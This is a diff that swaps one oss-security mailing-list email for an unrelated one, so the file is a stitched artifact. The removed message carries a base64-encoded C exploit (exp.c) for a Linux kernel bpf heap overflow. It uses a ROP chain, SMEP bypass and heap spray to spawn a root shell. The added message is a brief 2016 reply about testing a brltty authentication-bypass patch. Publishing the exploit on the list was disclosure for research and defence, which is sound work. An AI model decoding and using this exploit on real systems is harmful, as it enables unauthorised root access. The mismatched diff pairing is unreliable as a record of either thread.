@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["9910" "Saturday" "24" "November" "2018" "10:08:15" "+0100" "Yves-Alexis Perez" "corsac@debian.org" "<a40aa855b2656ce82d611ea22fb6fb0c76c86353.camel@debian.org>" "186" "Re: [oss-security] fwd: [vs-plain] Kernel heap overflow in bpf leading to LPE (exploit provided)" "^Date:" nil nil "11" "2018112409:08:15" "[oss-security] fwd: [vs-plain] Kernel heap overflow in bpf leading to LPE (exploit provided)" (number mark "        corsac@debia Nov 24  186/9910  " thread-indent "\"Re: [oss-security] fwd: [vs-plain] Kernel heap overflow in bpf leading to LPE (exploit provided)\"\n") "<e34d421111a59b59ab7a09fc954ea71d701936f5.camel@debian.org>" ("<20181123172208.GA16585@scapa.corsac.net>" "<20181123180914.GA10084@kroah.com>" "<e34d421111a59b59ab7a09fc954ea71d701936f5.camel@debian.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["592" "Tuesday" "12" "April" "2016" "05:14:06" "-0400" "Dave Mielke" "dave@mielke.cc" "<20160412091406.GB24278@beta.private.mielke.cc>" "13" "[oss-security] Re: CVE-Request for brltty auth bypass" nil nil nil "4" "2016041209:14:06" "[oss-security] Re: CVE-Request for brltty auth bypass" (number mark "U       dave@mielke. Apr 12   13/592   " thread-indent "\"[oss-security] Re: CVE-Request for brltty auth bypass\"\n") "<20160412074937.GA30265@suse.de>" ("<20160412074937.GA30265@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9515 invoked by uid 550); 24 Nov 2018 09:08:31 -0000
+Received: (qmail 23853 invoked by uid 550); 12 Apr 2016 09:52:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,206 +11,32 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9486 invoked from network); 24 Nov 2018 09:08:30 -0000
-Message-ID: <a40aa855b2656ce82d611ea22fb6fb0c76c86353.camel@debian.org>
-In-Reply-To: <e34d421111a59b59ab7a09fc954ea71d701936f5.camel@debian.org>
-References: <20181123172208.GA16585@scapa.corsac.net>
-	 <20181123180914.GA10084@kroah.com>
-	 <e34d421111a59b59ab7a09fc954ea71d701936f5.camel@debian.org>
-Content-Type: multipart/signed; micalg="pgp-sha256";
-	protocol="application/pgp-signature"; boundary="=-N6zsR2/4607Gkv7B8aSd"
-User-Agent: Evolution 3.30.2-1 
-Mime-Version: 1.0
-Date: Sat, 24 Nov 2018 10:08:15 +0100
-From: Yves-Alexis Perez <corsac@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] fwd: [vs-plain] Kernel heap overflow in bpf
- leading to LPE (exploit provided)
-To: oss-security@lists.openwall.com, Wei Wu <ww9210@gmail.com>
+Received: (qmail 26513 invoked from network); 12 Apr 2016 09:14:21 -0000
+X-Virus-Scanned: amavisd-new at mmprivatehosting.com
+Date: Tue, 12 Apr 2016 05:14:06 -0400
+From: Dave Mielke <dave@mielke.cc>
+To: Sebastian Krahmer <krahmer@suse.com>
+Cc: oss-security@lists.openwall.com, cve-assign@mitre.org
+Message-ID: <20160412091406.GB24278@beta.private.mielke.cc>
+References: <20160412074937.GA30265@suse.de>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20160412074937.GA30265@suse.de>
+User-Agent: Mutt/1.5.21 (2010-09-15)
+Subject: [oss-security] Re: CVE-Request for brltty auth bypass
 
---=-N6zsR2/4607Gkv7B8aSd
-Content-Type: multipart/mixed; boundary="=-mud+rsNwe5J3BPvruaFB"
+[quoted lines by Sebastian Krahmer on 2016/04/12 at 09:49 +0200]
 
+>I already contacted upstream (Cc) but so far no response.
 
---=-mud+rsNwe5J3BPvruaFB
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+I'm just awaiting the patch to be actually tested. It'll certainly be included 
+as soon as I'm informed that the test has been successful. I apreciate your 
+patch, and am also sure that you can appreciate my wanting to wait for it to be 
+tested.
 
-On Fri, 2018-11-23 at 21:45 +0100, Yves-Alexis Perez wrote:
-> On Fri, 2018-11-23 at 19:09 +0100, Greg KH wrote:
-> > As was discussed further on one of the threads on this topic, it looks
-> > like this is a 4.20-rc issue only, and that 4.19 does not have this
-> > issue.  So it might not be relevant to any distro at all, but I suggest
-> > that people test themselves to be sure.
->=20
-> Hi Greg, thanks for the precision.
-
-And considering no released kernel is vulnerable, here is the proof of conc=
-ept
-code provided initially.
-
-Regards,
---=20
-Yves-Alexis
-
---=-mud+rsNwe5J3BPvruaFB
-Content-Disposition: attachment; filename="exp.c"
-Content-Transfer-Encoding: base64
-Content-Type: text/x-csrc; name="exp.c"; charset="UTF-8"
-
-Ly8gZ2NjIC1vIGV4cCBleHAuYyAtc3RhdGljIC1mbm8tcGllCi8vIFNNRVAg
-YnlwYXNzIGV4cGxvaXQgIAovLyBhdXRob3Igd3c5MjEwCi8vIHBvYyBnZW5l
-cmF0ZWQgYnkgc3l6a2FsbGVyCi8qIAp1c2VyQHRlc3Q6fiQgLi9leHAKcm9w
-X3BheWxvYWRfaW5pdGlhbGl6ZWQKdWlkPTAocm9vdCkgZ2lkPTAocm9vdCkg
-Z3JvdXBzPTAocm9vdCkgY29udGV4dD1zeXN0ZW1fdTpzeXN0ZW1fcjprZXJu
-ZWxfdDpzMAojIHVuYW1lIC1hCkxpbnV4IHN5emthbGxlciA0LjIwLjAtcmMz
-ICMxIFNNUCBUaHUgTm92IDIyIDE1OjEyOjM4IENTVCAyMDE4IHg4Nl82NCBH
-TlUvTGludXgKIwoqLwojZGVmaW5lIF9HTlVfU09VUkNFCiNkZWZpbmUgU1BS
-QVlfTlVNQkVSIDE0CgojaW5jbHVkZSA8ZW5kaWFuLmg+CiNpbmNsdWRlIDxz
-dGRpbnQuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIu
-aD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwu
-aD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8dW5pc3RkLmg+
-CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNp
-bmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNs
-dWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRl
-IDxmY250bC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzeXMv
-aW9jdGwuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNkZWZpbmUgbmF0aXZl
-X3dyaXRlX2NyNCAweGZmZmZmZmZmODEwOTdmY2MKI2RlZmluZSBQUkVQQVJF
-X0tFUk5FTF9DUkVEIDB4ZmZmZmZmZmY4MTBlMzY3MAojZGVmaW5lIENPTU1J
-VF9DUkVEUyAgMHhmZmZmZmZmZjgxMGUzM2UwCiNkZWZpbmUgcG9wcmRpcmV0
-IDB4ZmZmZmZmZmY4MTAwMTNiOQojZGVmaW5lIHBvcHJheHJldCAweGZmZmZm
-ZmZmODEwMjljNzEKI2RlZmluZSBzd2FwZ3MgMHhmZmZmZmZmZjgxYzAwOTVm
-CiNkZWZpbmUgaXJldHEgMHhmZmZmZmZmZjgxMDZkOGY0CiNkZWZpbmUgc3Rh
-Y2tfcGl2b3RfZ2FkZ2V0IDB4ZmZmZmZmZmY4MTk1NGRjOAojZGVmaW5lIHN0
-YWNrX3RvcF9vZmZzZXQgMHg2NzQKI2RlZmluZSBrcm9wX2Jhc2VfdG9fbWFw
-IDB4ODE5NTQwMDAKaW50IHJvcF9zdGFydD0weDE0NDQtODsKdm9pZCoga3Jv
-cF9iYXNlX21hcHBlZDsKCnVuc2lnbmVkIGxvbmcgdXNlcl9jcywgdXNlcl9z
-cywgdXNlcl9yZmxhZ3M7CgpzdGF0aWMgdm9pZCBzYXZlX3N0YXRlKCkKewog
-ICAgYXNtKAogICAgICAgICJtb3ZxICUlY3MsICUwXG4iCiAgICAgICAgIm1v
-dnEgJSVzcywgJTFcbiIKICAgICAgICAicHVzaGZxXG4iCiAgICAgICAgInBv
-cHEgJTJcbiIKICAgICAgICA6ICI9ciIodXNlcl9jcyksICI9ciIodXNlcl9z
-cyksICI9ciIodXNlcl9yZmxhZ3MpCiAgICAgICAgOgogICAgICAgIDogIm1l
-bW9yeSIpOwp9Cgp2b2lkIGdldF9zaGVsbCgpCnsKICAgIHN5c3RlbSgiaWQi
-KTsKICAgIGNoYXIgKnNoZWxsID0gIi9iaW4vc2giOwogICAgY2hhciAqYXJn
-c1tdID0ge3NoZWxsLCBOVUxMfTsKICAgIGV4ZWN2ZShzaGVsbCwgYXJncywg
-TlVMTCk7Cn0KCnR5cGVkZWYgaW50IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0o
-MykpKSAoKiBfY29tbWl0X2NyZWRzKSh1bnNpZ25lZCBsb25nIGNyZWQpOwp0
-eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgz
-KSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNy
-ZWQpOwoKX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHMgPSAoX2NvbW1pdF9j
-cmVkcylDT01NSVRfQ1JFRFM7Cl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBh
-cmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpUFJFUEFS
-RV9LRVJORUxfQ1JFRDsKCnZvaWQgZ2V0X3Jvb3RfcGF5bG9hZCh2b2lkKQp7
-CiAgICBjb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7Cn0K
-LyoKdW5zaWduZWQgbG9uZyByb3BfY2hhaW5bXSA9IHsKICAgIHBvcHJkaXJl
-dCwKICAgIDB4NmYwLAogICAgbmF0aXZlX3dyaXRlX2NyNCwKICAgIGdldF9y
-b290X3BheWxvYWQsCiAgICBzd2FwZ3MsCiAgICAwLCAvL2R1bW15CiAgICBp
-cmV0cSwKICAgIGdldF9zaGVsbCwKICAgIDAsLy91c2VyX2NzLAogICAgMCwv
-L3VzZXJfcmZsYWdzLAogICAgMCwvL2tyb3BfYmFzZV9tYXBwZWQgKyAweDQw
-MDAsCiAgICAwLy91c2VyX3NzCn07CiovCiNkZWZpbmUgUE9QUkRYIDB4ZmZm
-ZmZmZmY4MTAwMmRkYQovLzB4ZmZmZmZmZmY4MTBkOWMwMSA6IHB1c2ggcmF4
-IDsgcHVzaCByYXggOyByZXQKI2RlZmluZSBEVU1NWSAwCnVuc2lnbmVkIGxv
-bmcgcm9wX2NoYWluW10gPSB7CiAgICBwb3ByYXhyZXQsCiAgICAweDZmMCwK
-ICAgIG5hdGl2ZV93cml0ZV9jcjQsCiAgICBwb3ByZGlyZXQsCiAgICAwLAog
-ICAgUFJFUEFSRV9LRVJORUxfQ1JFRCwKICAgIDB4ZmZmZmZmZmY4MTAwMWM1
-MCwgLy86IHBvcCByc2kgOyByZXQKICAgIHBvcHJkaXJldCwKICAgIDB4ZmZm
-ZmZmZmY4MTI2NDZmYiwgLy86IHB1c2ggcmF4IDsgcHVzaCByc2kgOyByZXQK
-ICAgIENPTU1JVF9DUkVEUywKICAgIHN3YXBncywKICAgICh1bnNpZ25lZCBs
-b25nKSZnZXRfc2hlbGwsCiAgICAwLC8vdXNlcl9jcywKICAgIDAsLy91c2Vy
-X3JmbGFncywKICAgIDAsLy9rcm9wX2Jhc2VfbWFwcGVkICsgMHg0MDAwLAog
-ICAgMC8vdXNlcl9zcwp9OwoKdm9pZCAqIGZha2VzdGFjazsKdm9pZCBwcmVw
-YXJlX2tyb3AoKXsKICAgIGtyb3BfYmFzZV9tYXBwZWQ9bW1hcCgodm9pZCAq
-KWtyb3BfYmFzZV90b19tYXAsMHg4MDAwLFBST1RfUkVBRHxQUk9UX1dSSVRF
-LE1BUF9QUklWQVRFfE1BUF9BTk9OWU1PVVMsLTEsMCk7CiAgICBpZiAoa3Jv
-cF9iYXNlX21hcHBlZDwwKXsKICAgICAgICBwZXJyb3IoIm1tYXAgZmFpbGVk
-Iik7CiAgICB9CiAgICBmYWtlc3RhY2s9bW1hcCgodm9pZCAqKTB4YTAwMDAw
-MDAwMCwweDgwMDAsUFJPVF9SRUFEfFBST1RfV1JJVEUsTUFQX1BSSVZBVEV8
-TUFQX0FOT05ZTU9VUywtMSwwKTsKICAgICoodW5zaWduZWQgbG9uZyopMHgw
-MDAwMDAwMDgxOTU0ZGM4PXBvcHJheHJldDsKICAgICoodW5zaWduZWQgbG9u
-Zyopa3JvcF9iYXNlX3RvX21hcCA9IDA7CiAgICAqKHVuc2lnbmVkIGxvbmcq
-KShrcm9wX2Jhc2VfdG9fbWFwKzB4MTAwMCkgPSAwOwogICAgKih1bnNpZ25l
-ZCBsb25nKikoa3JvcF9iYXNlX3RvX21hcCsweDIwMDApID0gMDsKICAgICoo
-dW5zaWduZWQgbG9uZyopKGtyb3BfYmFzZV90b19tYXArMHgzMDAwKSA9IDA7
-CiAgICAqKHVuc2lnbmVkIGxvbmcqKShrcm9wX2Jhc2VfdG9fbWFwKzB4NDAw
-MCkgPSAwOwogICAgKih1bnNpZ25lZCBsb25nKikoa3JvcF9iYXNlX3RvX21h
-cCsweDUwMDApID0gMDsKICAgICoodW5zaWduZWQgbG9uZyopKGtyb3BfYmFz
-ZV90b19tYXArMHg2MDAwKSA9IDA7CiAgICAqKHVuc2lnbmVkIGxvbmcqKShr
-cm9wX2Jhc2VfdG9fbWFwKzB4NzAwMCkgPSAwOwogICAgKih1bnNpZ25lZCBs
-b25nKikoZmFrZXN0YWNrKzB4NDAwMCkgPSAwOwogICAgKih1bnNpZ25lZCBs
-b25nKikoZmFrZXN0YWNrKzB4MzAwMCkgPSAwOwogICAgKih1bnNpZ25lZCBs
-b25nKikoZmFrZXN0YWNrKzB4MjAwMCkgPSAwOwogICAgKih1bnNpZ25lZCBs
-b25nKikoZmFrZXN0YWNrKzB4MTAwMCkgPSAwOwogICAgKih1bnNpZ25lZCBs
-b25nKikoZmFrZXN0YWNrKSA9IDA7CiAgICAqKHVuc2lnbmVkIGxvbmcqKShm
-YWtlc3RhY2srMHgxMCkgPSBzdGFja19waXZvdF9nYWRnZXQ7CiAgICAqKHVu
-c2lnbmVkIGxvbmcqKShmYWtlc3RhY2srMHg3MDAwKSA9IDA7CiAgICAqKHVu
-c2lnbmVkIGxvbmcqKShmYWtlc3RhY2srMHg2MDAwKSA9IDA7CiAgICAqKHVu
-c2lnbmVkIGxvbmcqKShmYWtlc3RhY2srMHg1MDAwKSA9IDA7CiAgICByb3Bf
-Y2hhaW5bMTJdPXVzZXJfY3M7CiAgICByb3BfY2hhaW5bMTNdPXVzZXJfcmZs
-YWdzOwogICAgcm9wX2NoYWluWzE0XT0odW5zaWduZWQgbG9uZykoZmFrZXN0
-YWNrICsgMHg2MDAwKTsKICAgIHJvcF9jaGFpblsxNV09dXNlcl9zczsKICAg
-IG1lbWNweShrcm9wX2Jhc2VfbWFwcGVkK3JvcF9zdGFydCxyb3BfY2hhaW4s
-c2l6ZW9mKHJvcF9jaGFpbikpOwogICAgcHV0cygicm9wX3BheWxvYWRfaW5p
-dGlhbGl6ZWQiKTsKfQoKI2lmbmRlZiBfX05SX2JwZgojZGVmaW5lIF9fTlJf
-YnBmIDMyMQojZW5kaWYKCnVpbnQ2NF90IHJbMV0gPSB7MHhmZmZmZmZmZmZm
-ZmZmZmZmfTsKCi8vIGRlZnJhZ21lbnRhdGlvbgp2b2lkIGRlZnJhZ21lbnQo
-KXsKICAgIGludCBpOwogICAgRklMRSogZnA7CiAgICBjaGFyIG5hbWVbMTAw
-XTsKICAgIGZvcihpPTA7IGk8MjAwOyBpKyspewogICAgICAgIHNucHJpbnRm
-KG5hbWUsIDEwMCwgInh4eCVkIiwgaSk7CiAgICAgICAgZnA9Zm9wZW4obmFt
-ZSwidyIpOwogICAgfQp9Cgpsb25nIHZpY3RpbVtTUFJBWV9OVU1CRVJdOwp2
-b2lkIHNwcmF5KCl7CiAgICBpbnQgaTsKICAgIGZvcihpPTA7aTxTUFJBWV9O
-VU1CRVI7aSsrKXsKICAgICAgICB2aWN0aW1baV0gPSBzeXNjYWxsKF9fTlJf
-YnBmLCAwLCAweDIwMDAxMWMwLCAweDJjKTsKICAgIH0KICAgIHJldHVybjsK
-fQppbnQgbWFpbih2b2lkKQp7CiAgc3lzY2FsbChfX05SX21tYXAsIDB4MjAw
-MDAwMDAsIDB4MTAwMDAwMCwgMywgMHgzMiwgLTEsIDApOwogIGxvbmcgcmVz
-ID0gMDsKICAqKHVpbnQzMl90KikweDIwMDAxMWMwID0gMHgxNzsKICAqKHVp
-bnQzMl90KikweDIwMDAxMWM0ID0gMDsKICAvLyoodWludDMyX3QqKTB4MjAw
-MDExYzggPSAweDEwMDA7CiAgLy8qKHVpbnQzMl90KikweDIwMDAxMWM4ID0g
-MHgyMDA7CiAgKih1aW50MzJfdCopMHgyMDAwMTFjOCA9IDB4NDA7CiAgKih1
-aW50MzJfdCopMHgyMDAwMTFjYyA9IC0xOwogICoodWludDMyX3QqKTB4MjAw
-MDExZDAgPSAwOwogICoodWludDMyX3QqKTB4MjAwMDExZDQgPSAtMTsKICAq
-KHVpbnQzMl90KikweDIwMDAxMWQ4ID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAw
-MDExZGMgPSAwOwogICoodWludDhfdCopMHgyMDAwMTFkZCA9IDA7CiAgKih1
-aW50OF90KikweDIwMDAxMWRlID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAwMDEx
-ZGYgPSAwOwogICoodWludDhfdCopMHgyMDAwMTFlMCA9IDA7CiAgKih1aW50
-OF90KikweDIwMDAxMWUxID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAwMDExZTIg
-PSAwOwogICoodWludDhfdCopMHgyMDAwMTFlMyA9IDA7CiAgKih1aW50OF90
-KikweDIwMDAxMWU0ID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAwMDExZTUgPSAw
-OwogICoodWludDhfdCopMHgyMDAwMTFlNiA9IDA7CiAgKih1aW50OF90Kikw
-eDIwMDAxMWU3ID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAwMDExZTggPSAwOwog
-ICoodWludDhfdCopMHgyMDAwMTFlOSA9IDA7CiAgKih1aW50OF90KikweDIw
-MDAxMWVhID0gMDsKICAqKHVpbnQ4X3QqKTB4MjAwMDExZWIgPSAwOwoKICBz
-YXZlX3N0YXRlKCk7CiAgcHJlcGFyZV9rcm9wKCk7CiAgcmVzID0gc3lzY2Fs
-bChfX05SX2JwZiwgMCwgMHgyMDAwMTFjMCwgMHgyYyk7CiAgaWYgKHJlcyAh
-PSAtMSkKICAgIHJbMF0gPSByZXM7CiAgc3ByYXkoKTsKCiAgKih1aW50MzJf
-dCopMHgyMDAwMDBjMCA9IHJbMF07CiAgKih1aW50NjRfdCopMHgyMDAwMDBj
-OCA9IDA7CiAgKih1aW50NjRfdCopMHgyMDAwMDBkMCA9IDB4MjAwMDAxNDA7
-CiAgKih1aW50NjRfdCopMHgyMDAwMDBkOCA9IDI7CiAgdWludDY0X3QqIHB0
-ciA9ICh1aW50NjRfdCopMHgyMDAwMDE0MDsKICBwdHJbMF09MTsKICBwdHJb
-MV09MjsKICBwdHJbMl09MzsKICBwdHJbM109NDsKICBwdHJbNF09NTsKICBw
-dHJbNV09NjsKICBwdHJbNl09MHhhMDAwMDAwMDAwOwogIHB0cls3XT04Owog
-IHN5c2NhbGwoX19OUl9icGYsIDIsIDB4MjAwMDAwYzAsIDB4MjApOwogIGlu
-dCBpOwogICoodW5zaWduZWQgbG9uZyopKGZha2VzdGFjaysweDcwMDApID0g
-MDsKICAqKHVuc2lnbmVkIGxvbmcqKShmYWtlc3RhY2srMHg2MDAwKSA9IDA7
-CiAgKih1bnNpZ25lZCBsb25nKikoZmFrZXN0YWNrKzB4NTAwMCkgPSAwOwog
-IGZvcihpPTA7aTxTUFJBWV9OVU1CRVI7aSsrKXsKICAgICAgY2xvc2Uodmlj
-dGltW2ldKTsKICB9CiAgcGF1c2UoKTsKICByZXR1cm4gMDsKfQo=
-
---=-mud+rsNwe5J3BPvruaFB--
-
---=-N6zsR2/4607Gkv7B8aSd
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: This is a digitally signed message part
-
------BEGIN PGP SIGNATURE-----
-
-iQEzBAABCAAdFiEE8vi34Qgfo83x35gF3rYcyPpXRFsFAlv5FP8ACgkQ3rYcyPpX
-RFs4cAgA3X5jtfSZ09itskHK/pWhVXAfpA+xSGp1JPjINgTCiw/P7HZXSrZIInzY
-He1ftFGfHjiPdQQiIU+cWZyfUhWsQ9Af7T3MeW35PuyXZXt6xblzXyRldnHr+PIl
-5EDaOQr5VTbBAdguLRyfb66SRS4FWAOwBBFvA4mXXIzJnYSxu2ZHtPFqEzY/52ev
-lziAKUzdIARDxuAm0xX/Z0W6YULk/PQs9LybgImHx6dPC0d12pvuKXZFqKFAJ9Mr
-KNm1naU5uVrq6+4+9WaXZA0ar7TA1/SRZho5h90Um6Ar+Nnq1nFsjZBGmwZoGDtU
-gHIH8PFgHpynStjXc9X/jFyLxiSNcA==
-=7NrG
------END PGP SIGNATURE-----
-
---=-N6zsR2/4607Gkv7B8aSd--
+-- 
+Dave Mielke           | 2213 Fox Crescent | The Bible is the very Word of God.
+Phone: 1-613-726-0014 | Ottawa, Ontario   | http://Mielke.cc/bible/
+EMail: Dave@Mielke.cc | Canada  K2A 1H7   | http://FamilyRadio.org/
